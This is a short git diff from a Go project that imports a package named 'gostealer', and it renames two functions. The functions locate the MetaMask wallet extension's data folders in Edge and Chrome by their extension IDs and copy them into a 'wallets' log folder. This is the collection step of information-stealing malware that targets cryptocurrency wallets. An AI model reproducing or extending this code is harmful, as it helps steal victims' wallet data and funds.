@@ -6,7 +6,7 @@ import (
 	"github.com/4kord/gostealer/utils"
 )
 
-func GetMetamaskEdge(browserPath, logFolderPath string) {
+func CopyMetamaskEdge(browserPath, logFolderPath string) {
 	//metamask edge version
 	metamaske := path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")
 
@@ -18,7 +18,7 @@ func GetMetamaskEdge(browserPath, logFolderPath string) {
 	utils.CopyFolderFiles(metamaskc, path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"))
 }
 
-func GetMetamaskChrome(browserPath, logFolderPath string) {
+func CopyMetamaskChrome(browserPath, logFolderPath string) {
 	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
 
 	utils.CopyFolderFiles(metamask, path.Join(logFolderPath, "wallets", "metamask_chrome"))
